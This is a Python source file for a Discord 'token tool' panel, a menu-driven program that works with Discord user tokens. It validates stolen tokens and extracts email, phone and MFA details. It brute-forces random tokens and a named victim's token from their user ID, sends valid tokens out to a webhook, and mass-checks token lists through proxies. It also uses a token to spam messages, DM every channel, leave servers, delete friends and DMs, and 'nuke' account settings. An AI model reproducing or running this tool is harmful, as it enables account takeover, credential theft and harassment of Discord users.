import os
import requests
import string
import random
import threading
import time
import json
from itertools import cycle
from datetime import datetime, timezone, UTC
import base64
import sys
import platform
import hashlib
from colorama import Fore
RESET = '[0m'
WHITE = '[97m'
RED = '[91m'
GREEN = '[92m'
YELLOW = '[93m'
BLUE = '[94m'
BEFORE = '[94m'
AFTER = '[0m'
INPUT = '[92m'
INFO = '[93m'
GEN_VALID = '[92m'
GEN_INVALID = '[91m'
BEFORE_GREEN = '[92m'
AFTER_GREEN = '[0m'
TOKEN_FILE = 'input/token.txt'
def load_tokens():
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, 'r') as f:
            return [line.strip() for line in f if line.strip()]
        return []
    else:
        return []
def print_boxed(info_dict):
    print(f"{WHITE}{'────────────────────────────────────────────────────────────────────────────────'}{RESET}")
    for key, value in info_dict.items():
        print(f'{YELLOW}{key:20}:{WHITE} {value}{RESET}')
    print(f"{WHITE}{'────────────────────────────────────────────────────────────────────────────────'}{RESET}")
def get_token_info(token):
    try:
        api = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()
        response = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
        status = 'Valid' if response.status_code == 200 else 'Invalid'
        username = api.get('username', 'None') + '#' + api.get('discriminator', 'None')
        display_name = api.get('global_name', 'None')
        user_id = api.get('id', 'None')
        email = api.get('email', 'None')
        email_verified = api.get('verified', 'None')
        phone = api.get('phone', 'None')
        mfa = api.get('mfa_enabled', 'None')
        country = api.get('locale', 'None')
        avatar = api.get('avatar', 'None')
        avatar_decoration = api.get('avatar_decoration_data', 'None')
        public_flags = api.get('public_flags', 'None')
        flags = api.get('flags', 'None')
        banner = api.get('banner', 'None')
        banner_color = api.get('banner_color', 'None')
        accent_color = api.get('accent_color', 'None')
        nsfw = api.get('nsfw_allowed', 'None')
        try:
            created_at = datetime.fromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000, timezone.utc)
        except:
            created_at = 'None'
        try:
            premium = api.get('premium_type', 0)
            if premium == 0:
                nitro = 'False'
            else:
                if premium == 1:
                    nitro = 'Nitro Classic'
                else:
                    if premium == 2:
                        nitro = 'Nitro Boosts'
                    else:
                        if premium == 3:
                            nitro = 'Nitro Basic'
                        else:
                            nitro = 'False'
        except:
            nitro = 'None'
        try:
            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{api['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{api['avatar']}.png"
        except:
            avatar_url = 'None'
        return {'Status': status, 'Token': token, 'Username': username, 'Display Name': display_name, 'Id': user_id, 'Created': created_at, 'Country': country, 'Email': email, 'Verified': email_verified, 'Phone': phone, 'MFA': mfa, 'Nitro': nitro, 'Avatar Decor': avatar_decoration, 'Avatar': avatar, 'Avatar URL': avatar_url, 'Accent Color': accent_color, 'Banner': banner, 'Banner Color': banner_color, 'Flags': flags, 'Public Flags': public_flags, 'NSFW': nsfw}
    except Exception as e:
        return {'Status': 'Invalid', 'Token': token, 'Error': str(e)}
def token_login():
    tokens = load_tokens()
    if not tokens:
        print(f'{RED}❌ No tokens found in input/token.txt{RESET}')
        input('Press Enter to return to menu...')
        return
    else:
        print(f'{YELLOW}Testing all tokens from input/token.txt...{RESET}')
        for token in tokens:
            try:
                headers = {'Authorization': token, 'Content-Type': 'application/json'}
                r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
                if r.status_code == 200:
                    user = r.json()
                    print(f"{GREEN}✅ Valid token: {token} | User: {user.get('username', 'Unknown')}#{user.get('discriminator', '')}{RESET}")
                else:
                    print(f'{RED}❌ Invalid token: {token} | Status code: {r.status_code}{RESET}')
            except Exception as e:
                print(f'{RED}❌ Error testing token {token}: {e}{RESET}')
        input('Press Enter to return to menu...')
def generate_single_token():
    first = ''.join((random.choice(string.ascii_letters + string.digits + '-_') for _ in range(random.choice([24, 26]))))
    second = ''.join((random.choice(string.ascii_letters + string.digits + '-_') for _ in range(6)))
    third = ''.join((random.choice(string.ascii_letters + string.digits + '-_') for _ in range(38)))
    return f'{first}.{second}.{third}'
def send_webhook(embed_content, webhook_url):
    headers = {'Content-Type': 'application/json'}
    requests.post(webhook_url, data=json.dumps(embed_content), headers=headers)
def token_check(token, webhook_url=None, use_webhook=False):
    try:
        user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
        user['username']
        if use_webhook and webhook_url:
                embed_content = {'title': 'Token Valid!', 'description': f'**Token:**\n```{token}```', 'color': 1752220}
                send_webhook(embed_content, webhook_url)
        print(f'{GREEN}✅ Valid Token: {token}{RESET}')
    except:
        print(f'{RED}❌ Invalid Token: {token}{RESET}')
def token_generator():
    print(f'{YELLOW}Generates random Discord tokens and optionally validates them.{RESET}')
    use_webhook = input('Send valid tokens to a webhook? (y/n) -> ').lower() in ['y', 'yes']
    webhook_url = None
    if use_webhook:
        webhook_url = input('Webhook URL -> ').strip()
    try:
        threads_number = int(input('Number of threads -> '))
    except:
        print(f'{RED}❌ Invalid input{RESET}')
        input('Press Enter to return to menu...')
        return
    def worker():
        token = generate_single_token()
        token_check(token, webhook_url, use_webhook)
    print(f'{YELLOW}Press CTRL+C to stop token generation.{RESET}')
    try:
        threads = []
        for _ in range(threads_number):
            t = threading.Thread(target=worker)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        pass
    print(f'{YELLOW}Stopping token generation.{RESET}')
    input('Press Enter to return to menu...')
    return
def token_nuker():
    tokens = load_tokens()
    if not tokens:
        print(f'{RED}❌ No tokens found{RESET}')
        input('Press Enter to return...')
        return
    print(f'{YELLOW}Rapidly change status, theme, and language using a token.{RESET}')
    token = tokens[0]
    custom_status_input = input('Custom Status -> ').strip()
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    default_status = 'Nuking By DiscordTool'
    custom_status = f'{custom_status_input} | Nuker'
    modes = cycle(['light', 'dark'])
    try:
        requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers, json={'custom_status': {'text': default_status}})
        print(f'{GREEN}✅ Default status set: {default_status}{RESET}')
        for _ in range(5):
            lang = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
            requests.patch('https://discord.com/api/v7/users/@me/settings', headers=headers, json={'locale': lang})
            theme = next(modes)
            requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json={'theme': theme})
            time.sleep(0.5)
        requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers, json={'custom_status': {'text': custom_status}})
        print(f'{GREEN}✅ Custom status set: {custom_status}{RESET}')
        for _ in range(5):
            lang = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
            requests.patch('https://discord.com/api/v7/users/@me/settings', headers=headers, json={'locale': lang})
            theme = next(modes)
            requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json={'theme': theme})
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    print(f'{YELLOW}⚠️ Nuker stopped by user{RESET}')
    input('Press Enter to return to menu...')
    return
def token_joiner():
    tokens = load_tokens()
    if not tokens:
        print(f'{RED}❌ No tokens found{RESET}')
        input('Press Enter to return...')
        return
    else:
        token = tokens[0]
        invite = input('Invite link -> ').strip()
        invite_code = invite.split('/')[(-1)]
        try:
            response = requests.get(f'https://discord.com/api/v9/invites/{invite_code}')
            server_name = response.json().get('guild', {}).get('name', invite)
        except:
            server_name = invite
        try:
            r = requests.post(f'https://discord.com/api/v9/invites/{invite_code}', headers={'Authorization': token})
            if r.status_code == 200:
                print(f'{GREEN}✅ Joined Server: {server_name}{RESET}')
            else:
                print(f'{RED}❌ Error {r.status_code} Server: {server_name}{RESET}')
        except:
            print(f'{RED}❌ Error Server: {server_name}{RESET}')
        input('Press Enter to return to menu...')
def token_leaver():
    tokens = load_tokens()
    if not tokens:
        print(f'{RED}❌ No tokens found{RESET}')
        input('Press Enter to return...')
        return
    token = tokens[0]
    try:
        guilds = requests.get('https://discord.com/api/v8/users/@me/guilds', headers={'Authorization': token}).json()
        if not guilds:
            print(f'{YELLOW}⚠️ No servers found{RESET}')
            input('Press Enter to return...')
            return
        for guild in guilds:
            try:
                r = requests.delete(f"https://discord.com/api/v8/users/@me/guilds/{guild['id']}", headers={'Authorization': token})
                if r.status_code in [200, 204]:
                    print(f"{GREEN}✅ Left Server: {guild['name']}{RESET}")
                else:
                    print(f"{RED}❌ Error {r.status_code} Server: {guild['name']}{RESET}")
            except Exception as e:
                print(f'{RED}❌ Error: {e}{RESET}')
    except Exception as e:
        print(f'{RED}❌ Error: {e}{RESET}')
    input('Press Enter to return to menu...')
def get_creation_date(user_id: int) -> datetime:
    return datetime.fromtimestamp((user_id >> 22) / 1000 + 1420070400, tz=timezone.utc)
def format_age(created_at: datetime) -> str:
    now = datetime.now(timezone.utc)
    months = (now.year - created_at.year) * 12 + now.month - created_at.month
    return f'{months} Month(s)'
def save_to_file(path: str, content: str):
    with open(path, 'a', encoding='utf-8') as f:
        f.write(content + '\n')
def check_token(line, proxies, valid_path, invalid_path):
    token = line.strip().split(':')[-1]
    try:
        with open('input/user-agents.txt', 'r', encoding='utf-8') as f:
            user_agents = f.read().splitlines()
        if user_agents:
            user_agent = random.choice(user_agents)
        else:
            raise ValueError('user-agents.txt is empty!')
    except Exception as e:
        print(f'[!] Error loading user-agents.txt: {e}')
        return
    headers = {'Authorization': token, 'User-Agent': user_agent}
    timestamp = datetime.now().strftime('%I:%M%p')
    try:
        u = requests.get('https://discord.com/api/v10/users/@me', headers=headers, proxies=proxies, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f'{timestamp} [!] Error checking user: {e}')
        return
    slots = None
    try:
        slots = requests.get('https://discord.com/api/v10/users/@me/guilds/premium/subscription-slots', headers=headers, proxies=proxies, timeout=10)
    except requests.exceptions.RequestException:
        pass
    if u.status_code != 200:
        log = f'{timestamp} <+> Checked Token. Token={token} Status=Invalid'
        print(log)
        save_to_file(invalid_path, log)
        return
    else:
        user = u.json()
        age = format_age(get_creation_date(int(user['id'])))
        verif = 'Fully Verified' if user.get('verified') else 'Unverified'
        nitro_type = user.get('premium_type', 0)
        has_nitro = nitro_type in (1, 2)
        nitro_str = 'True' if has_nitro else 'False'
        expiry = '28 Day(s)'
        boosts = 0
        if slots and slots.status_code == 200:
            arr = slots.json()
            boosts = sum(1 for s in arr if not s.get('guild_id') and not s.get('cooldown_ends_at'))
        log = f'{timestamp} <+> Checked Token. Token={token} Status=Valid Age="{age}" Verification-Status="{verif}" Redeemable=False Has-Nitro={nitro_str} Nitro-Expiry="{expiry}" Unused-Boosts={boosts}'
        print(log)
        save_to_file(valid_path, log)

def start_checker():
    input_file = input('File: ').strip()
    proxy_line = input('Proxy: ').strip()
    proxy_url = f'http://{proxy_line}'
    proxies = {'http': proxy_url, 'https': proxy_url}
    valid_path = os.path.join('output', 'tokens_valid.txt')
    invalid_path = os.path.join('output', 'tokens_invalid.txt')
    timestamp = datetime.now().strftime('%I:%M%p')
    try:
        test_resp = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5)
        if test_resp.status_code == 200:
            ip = test_resp.json().get('origin', 'N/A')
            print(f'{timestamp} [+] Proxy OK | IP: {ip}')
        else:
            print(f'{timestamp} [!] Proxy test failed | Code: {test_resp.status_code}')
            return
    except requests.exceptions.RequestException as e:
        print(f'{timestamp} [!] Proxy error: {e}')
        return
    if not os.path.exists(input_file):
        print(f'{timestamp} [!] File not found: {input_file}')
        return
    with open(input_file, 'r', encoding='utf-8') as f:
        lines = f.readlines()
    for line in lines:
        if ':' not in line or len(line.strip().split(':')) < 3:
            print(f'[!] Skipped line (bad format): {line.strip()}')
            continue
        check_token(line.strip(), proxies, valid_path, invalid_path)
def token_spammer():
    tokens = load_tokens()
    if not tokens:
        print(f'{RED}❌ No tokens found{RESET}')
        input('Press Enter to return...')
        return
    else:
        token = tokens[0]
        target_id = input('Target ID (User or Channel) -> ').strip()
        message = input('Message -> ').strip()
        try:
            count = int(input('Number of messages -> '))
        except:
            print(f'{RED}❌ Invalid input{RESET}')
            input('Press Enter to return...')
            return
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        for _ in range(count):
            try:
                r = requests.post(f'https://discord.com/api/v9/channels/{target_id}/messages', headers=headers, json={'content': message})
                if r.status_code == 200:
                    print(f'{GREEN}✅ Message sent{RESET}')
                else:
                    print(f'{RED}❌ Error {r.status_code}{RESET}')
            except Exception as e:
                print(f'{RED}❌ Exception: {e}{RESET}')
        input('Press Enter to return to menu...')
def token_delete_friend():
    tokens = load_tokens()
    if not tokens:
        print(f'{RED}❌ No tokens found{RESET}')
        input('Press Enter to return...')
        return
    else:
        token = tokens[0]
        friend_id = input('Friend ID -> ').strip()
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        try:
            r = requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend_id}', headers=headers)
            if r.status_code in [200, 204]:
                print(f'{GREEN}✅ Friend deleted: {friend_id}{RESET}')
            else:
                print(f'{RED}❌ Error {r.status_code}{RESET}')
        except Exception as e:
            print(f'{RED}❌ Exception: {e}{RESET}')
        input('Press Enter to return to menu...')
def token_block_friend():
    tokens = load_tokens()
    if not tokens:
        print(f'{RED}❌ No tokens found{RESET}')
        input('Press Enter to return...')
        return
    else:
        token = tokens[0]
        friend_id = input('Friend ID -> ').strip()
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        try:
            r = requests.put(f'https://discord.com/api/v8/users/@me/relationships/{friend_id}', headers=headers, json={'type': 2})
            if r.status_code in [200, 204]:
                print(f'{GREEN}✅ Friend blocked: {friend_id}{RESET}')
            else:
                print(f'{RED}❌ Error {r.status_code}{RESET}')
        except Exception as e:
            print(f'{RED}❌ Exception: {e}{RESET}')
        input('Press Enter to return to menu...')
def token_delete_dm():
    tokens = load_tokens()
    if not tokens:
        print(f'{RED}❌ No tokens found{RESET}')
        input('Press Enter to return...')
        return
    else:
        token = tokens[0]
        dm_id = input('DM ID -> ').strip()
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        try:
            r = requests.delete(f'https://discord.com/api/v9/channels/{dm_id}', headers=headers)
            if r.status_code in [200, 204]:
                print(f'{GREEN}✅ DM {dm_id} deleted{RESET}')
            else:
                print(f'{RED}❌ Error {r.status_code}{RESET}')
        except Exception as e:
            print(f'{RED}❌ Exception: {e}{RESET}')
        input('Press Enter to return to menu...')
def token_status_changer():
    tokens = load_tokens()
    if not tokens:
        print(f'{RED}❌ No tokens found{RESET}')
        input('Press Enter to return...')
        return
    else:
        token = tokens[0]
        status_options = ['online', 'idle', 'dnd', 'invisible']
        print(f'Available statuses: {status_options}')
        status = input('New status -> ').strip().lower()
        if status not in status_options:
            print(f'{RED}❌ Invalid status{RESET}')
            input('Press Enter to return...')
            return
        else:
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            try:
                payload = {'status': status}
                r = requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers, json=payload)
                if r.status_code in [200, 204]:
                    print(f'{GREEN}✅ Status changed: {status}{RESET}')
                else:
                    print(f'{RED}❌ Error {r.status_code}{RESET}')
            except Exception as e:
                print(f'{RED}❌ Exception: {e}{RESET}')
            input('Press Enter to return to menu...')
def token_language_changer():
    print(f'{YELLOW}Change your Discord client language.{RESET}')
    tokens = load_tokens()
    if not tokens:
        print(f'{RED}❌ No tokens found in input/token.txt{RESET}')
        input('Press Enter to return to menu...')
        return
    else:
        lang_options = ['da', 'de', 'en-GB', 'en-US', 'es-ES', 'fr', 'hr', 'it', 'lt', 'hu', 'nl', 'no', 'pl', 'pt-BR', 'ro', 'fi', 'sv-SE', 'vi', 'tr', 'cs', 'el', 'bg', 'ru', 'uk', 'th', 'zh-CN', 'ja', 'zh-TW', 'ko']
        print(f'Available languages: {lang_options}')
        lang = input('New language -> ').strip()
        if lang not in lang_options:
            print(f'{RED}❌ Invalid language{RESET}')
            input('Press Enter to return to menu...')
            return
        else:
            headers_list = [{'Authorization': token, 'Content-Type': 'application/json'} for token in tokens]
            for token, headers in zip(tokens, headers_list):
                try:
                    payload = {'locale': lang}
                    r = requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers, json=payload)
                    if r.status_code in [200, 204]:
                        print(f'{GREEN}✅ Token {token}: Language changed to {lang}{RESET}')
                    else:
                        print(f'{RED}❌ Token {token}: Error {r.status_code}{RESET}')
                except Exception as e:
                    print(f'{RED}❌ Token {token}: Exception {e}{RESET}')
            input('Press Enter to return to menu...')
def token_house_changer():
    tokens = load_tokens()
    if not tokens:
        print(f'{RED}❌ No tokens found{RESET}')
        input('Press Enter to return...')
        return
    else:
        token = tokens[0]
        house_id = input('New house/layout ID -> ').strip()
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        try:
            payload = {'house_id': house_id}
            r = requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers, json=payload)
            if r.status_code in [200, 204]:
                print(f'{GREEN}✅ House/layout changed to {house_id}{RESET}')
            else:
                print(f'{RED}❌ Error {r.status_code}{RESET}')
        except Exception as e:
            print(f'{RED}❌ Exception: {e}{RESET}')
        input('Press Enter to return to menu...')
def token_theme_changer():
    tokens = load_tokens()
    if not tokens:
        print(f'{RED}❌ No tokens found{RESET}')
        input('Press Enter to return...')
        return
    else:
        token = tokens[0]
        theme_options = ['light', 'dark']
        print(f'Available themes: {theme_options}')
        theme = input('New theme -> ').strip().lower()
        if theme not in theme_options:
            print(f'{RED}❌ Invalid theme{RESET}')
            input('Press Enter to return...')
            return
        else:
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            try:
                r = requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers, json={'theme': theme})
                if r.status_code in [200, 204]:
                    print(f'{GREEN}✅ Theme changed to {theme}{RESET}')
                else:
                    print(f'{RED}❌ Error {r.status_code}{RESET}')
            except Exception as e:
                print(f'{RED}❌ Exception: {e}{RESET}')
            input('Press Enter to return to menu...')
def token_dm_all():
    tokens = load_tokens()
    if not tokens:
        print(f'{RED}❌ No tokens found{RESET}')
        input('Press Enter to return...')
        return
    
    token = tokens[0]
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    message = input(f'{YELLOW}Message to send -> {RESET}').strip()
    print(f'{YELLOW}Choose sending mode:{RESET}')
    print('1. DMs only')
    print('2. Server text channels only')
    print('3. Both DMs and server text channels')
    mode = input(f'{YELLOW}Mode (1/2/3) -> {RESET}').strip()
    
    def get_dm_channels():
        try:
            response = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers)
            if response.status_code == 200:
                channels = response.json()
                return [channel for channel in channels if channel['type'] == 1]
            else:
                print(f'{RED}❌ Error fetching DM channels: Code {response.status_code}{RESET}')
                return []
        except Exception as e:
            print(f'{RED}❌ Error: {e}{RESET}')
            return []
    
    def get_server_channels():
        try:
            guilds = requests.get('https://discord.com/api/v8/users/@me/guilds', headers=headers).json()
            text_channels = []
            for guild in guilds:
                guild_id = guild['id']
                response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers)
                if response.status_code == 200:
                    channels = response.json()
                    for channel in channels:
                        if channel['type'] == 0:
                            permissions = channel.get('permissions', 0)
                            if permissions & 2048:
                                text_channels.append(channel)
                else:
                    print(f'{RED}❌ Error fetching channels for guild {guild_id}: Code {response.status_code}{RESET}')
            return text_channels
        except Exception as e:
            print(f'{RED}❌ Error fetching server channels: {e}{RESET}')
            return []
    
    def send_message(channel_id, message):
        try:
            response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json={'content': message})
            if response.status_code in (200, 201):
                return True
            else:
                print(f'{RED}❌ Error sending message to channel {channel_id}: Code {response.status_code}{RESET}')
                return False
        except Exception as e:
            print(f'{RED}❌ Error: {e}{RESET}')
            return False
    
    try:
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if response.status_code != 200:
            print(f'{RED}❌ Invalid token or API error: Code {response.status_code}{RESET}')
            input('Press Enter to return...')
            return
        
        dm_channels = []
        server_channels = []
        if mode in ['1', '3']:
            dm_channels = get_dm_channels()
            if not dm_channels:
                print(f'{YELLOW}⚠️ No DM channels found{RESET}')
        if mode in ['2', '3']:
            server_channels = get_server_channels()
            if not server_channels:
                print(f'{YELLOW}⚠️ No accessible server text channels found{RESET}')
        
        total_channels = dm_channels + server_channels
        if not total_channels:
            print(f'{RED}❌ No channels available to send messages{RESET}')
            input('Press Enter to return...')
            return
        
        print(f'{GREEN}✅ Found {len(total_channels)} channels (DMs: {len(dm_channels)}, Server: {len(server_channels)}). Sending messages...{RESET}')
        for channel in total_channels:
            channel_id = channel['id']
            try:
                if send_message(channel_id, message):
                    print(f'{GREEN}✅ Message sent to channel {channel_id}{RESET}')
                else:
                    print(f'{RED}❌ Failed to send to channel {channel_id}{RESET}')
                time.sleep(1)
            except Exception as e:
                print(f'{RED}❌ Error sending to channel {channel_id}: {e}{RESET}')
        print(f'{GREEN}✅ Sending completed to {len(total_channels)} channels{RESET}')
        input('Press Enter to return to menu...')
    except Exception as e:
        print(f'{RED}❌ Error validating token: {e}{RESET}')
        input('Press Enter to return...')
def Title(title):
    print(f"\n{title}\n{'=' * len(title)}\n")
def current_time_hour():
    return time.strftime('%H:%M:%S')
def ErrorModule(e):
    print(f'Error loading module: {e}')
def Error(e):
    print(f'Error: {e}')
def Slow(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.05)
    print()
def Continue():
    input('Press Enter to continue...')
def Reset():
    exit()
def CheckWebhook(webhook_url):
    try:
        response = requests.get(webhook_url)
        if response.status_code != 200:
            print(f'Invalid webhook URL: {webhook_url}')
            Reset()
    except requests.exceptions.RequestException as e:
        print(f'Error checking webhook: {e}')
        Reset()

def ErrorNumber():
    print('Invalid number. Please enter a valid integer.')
    Reset()

def bruteforce():
    Title('Discord Token To Id')
    try:
        userid = input(f'{BEFORE + current_time_hour() + AFTER} {INPUT} Victime ID -> {RESET}')
        OnePartToken = str(base64.b64encode(userid.encode('utf-8')), 'utf-8').replace('=', '')
        print(f'{BEFORE + current_time_hour() + AFTER} {INFO} Part One Token: {WHITE}{OnePartToken}.{RESET}')
        brute = input(f'{BEFORE + current_time_hour() + AFTER} {INPUT} Find the second part by brute force ? (y/n) -> {RESET}')
        if brute.lower() not in ['y', 'yes']:
            Continue()
            Reset()
        webhook = input(f'{BEFORE + current_time_hour() + AFTER} {INPUT} Webhook ? (y/n) -> {RESET}')
        webhook_url = None
        if webhook.lower() in ['y', 'yes']:
            webhook_url = input(f'{BEFORE + current_time_hour() + AFTER} {INPUT} Webhook URL -> {RESET}')
            CheckWebhook(webhook_url)
        try:
            threads_number = int(input(f'{BEFORE + current_time_hour() + AFTER} {INPUT} Threads Number -> {RESET}'))
        except ValueError:
            ErrorNumber()

        def send_webhook(embed_content):
            payload = {'embeds': [embed_content], 'username': 'Discord Token Finder', 'avatar_url': 'https://example.com/avatar.png'}
            headers = {'Content-Type': 'application/json'}
            requests.post(webhook_url, data=json.dumps(payload), headers=headers)

        def token_check():
            try:
                first = OnePartToken
                second = ''.join((random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(6)))
                third = ''.join((random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(38)))
                token = f'{first}.{second}.{third}'
                response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
                if response.status_code == 200:
                    if webhook.lower() in ['y', 'yes'] and webhook_url:
                        embed_content = {'title': 'Token Valid !', 'description': f'**Token:**\n```{token}```', 'color': 3066993, 'footer': {'text': 'Discord Token Finder', 'icon_url': 'https://example.com/avatar.png'}}
                        send_webhook(embed_content)
                    print(f'{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Status: {WHITE}Valid{GREEN} Token: {WHITE}{token}{GREEN}')
                else:
                    print(f'{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Status: {WHITE}Invalid{RED} Token: {WHITE}{token}{RED}')
            except Exception as e:
                print(f'{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Status: {WHITE}Error{RED} Token: {WHITE}{token}{RED} Error: {e}')

        def request():
            threads = []
            try:
                for _ in range(int(threads_number)):
                    t = threading.Thread(target=token_check)
                    t.start()
                    threads.append(t)
            except ValueError:
                ErrorNumber()
            for thread in threads:
                thread.join()

        while True:
            request()
    except Exception as e:
        Error(e)

def main_menu():
    while True:
        print(f'{Fore.LIGHTCYAN_EX}=== Discord Token-Tool Pannel ===                                                                                                                                                                                                                 \n                                               =*#%#*:                 \n                                            =+%%%%%%**%*               \n                                        :+###**%%%%%%%%#%%#+           \n                                     -+###*######%%%%%%%%%%#-+         \n                                  -**##*#############*###: :#*         \n                               =**#**############*#%#+:.=##+=:         \n                           :+*****#####+##*###*#%#+:.-**++=.           \n                        -+*****##*##*##*###*#%#=:.-**++=:              \n                     -*****#*##*####*###*##*=:.=**++=                  \n                  -=++*****#####**##**##*=::=**++-                     \n                   .-##*+******##**##*=::=**++=                        \n                 ..  ..=##*+*#**%#*=:-+**++=                           \n              .-## ......:+####*-:-+**++-                              \n           ..........:..... ###-+**++-                                 \n          =*........:=:.   -####++-                                    \n           .:** ..::.       ***=                                       \n             .:-*-                                                     \n                ..                                                                                                                                                                                                                                                                   \n1  Token Login            | 6  Token Leaver           | 11 Token Status Changer    | 16 ID Token to bruteforce   \n2  Token Info             | 7  Token Spammer          | 12 Token Language Changer  | 17 DM All\n3  Token Generator        | 8  Token Delete Friend    | 13 Token House Changer     |\n4  Token Nuker            | 9  Token Block Friend     | 14 Token Theme Changer     |\n5  Token Joiner           | 10 Token Delete DM        | 15 Token checker advanced  |\n0  Quit\n')
        choice = input('Your choice -> ').strip()
        if choice == '1':
            token_login()
        elif choice == '2':
            tokens = load_tokens()
            for token in tokens:
                info = get_token_info(token)
                print_boxed(info)
            input('Press Enter to return to menu...')
        elif choice == '3':
            token_generator()
        elif choice == '4':
            token_nuker()
        elif choice == '5':
            token_joiner()
        elif choice == '6':
            token_leaver()
        elif choice == '7':
            token_spammer()
        elif choice == '8':
            token_delete_friend()
        elif choice == '9':
            token_block_friend()
        elif choice == '10':
            token_delete_dm()
        elif choice == '11':
            token_status_changer()
        elif choice == '12':
            token_language_changer()
        elif choice == '13':
            token_house_changer()
        elif choice == '14':
            token_theme_changer()
        elif choice == '15':
            start_checker()
        elif choice == '16':
            bruteforce()
        elif choice == '17':
            token_dm_all()
        elif choice == '0':
            print(f'{YELLOW}⚠️ Exiting...{RESET}')
            return
        else:
            print(f'{RED}❌ Invalid choice{RESET}')
            input('Press Enter to return to menu...')

if __name__ == '__main__':
    def clear_screen():
        if os.name == 'posix':
            os.system('clear')
        else:
            os.system('cls')

    def getchecksum():
        md5_hash = hashlib.md5()
        with open(sys.argv[0], 'rb') as file:
            md5_hash.update(file.read())
        return md5_hash.hexdigest()

    clear_screen()
    print(Fore.BLUE, '\n               \n    ')
    main_menu()